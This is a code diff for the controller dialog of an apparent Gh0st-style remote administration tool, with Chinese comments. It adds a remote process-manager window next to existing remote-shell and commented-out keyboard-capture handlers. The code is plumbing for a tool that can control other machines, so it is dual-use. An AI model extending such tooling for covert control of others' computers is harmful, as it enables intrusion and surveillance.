@@ -82,6 +82,8 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
 	ON_MESSAGE(WM_ADDTOLIST,OnAddToList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
+
 
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
@@ -508,6 +510,8 @@ void CCcRemoteDlg::OnOnlineFile()
 void CCcRemoteDlg::OnOnlineProcess()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SYSTEM;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -757,9 +761,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		//case KEYBOARD_DLG:
 		//	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
 		//	break;
-		//case SYSTEM_DLG:
-		//	((CSystemDlg *)dlg)->OnReceiveComplete();
-		//	break;
+		case SYSTEM_DLG:
+			((CSystemDlg *)dlg)->OnReceiveComplete();
+		break;
 		case SHELL_DLG:
 			((CShellDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -816,10 +820,10 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_KEYBOARD_START:
 		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_PSLIST:
-		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
 		break;*/
+	case TOKEN_PSLIST:
+		g_pCcRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		break;
 	case TOKEN_SHELL_START:
 		g_pCcRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;
@@ -968,5 +972,21 @@ LRESULT CCcRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 
 	pContext->m_Dialog[0] = SHELL_DLG;
 	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
+
+//打开进程管理窗口
+LRESULT CCcRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg
+
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SYSTEM, GetDesktopWindow());      //创建对话框
+	dlg->ShowWindow(SW_SHOW);                      //显示对话框
+
+	pContext->m_Dialog[0] = SYSTEM_DLG;              //这个值用做服务端再次发送数据时的标识
+	pContext->m_Dialog[1] = (int)dlg;
+	//先看一下这个对话框的界面再看这个对话框类的构造函数
 	return 0;
 }
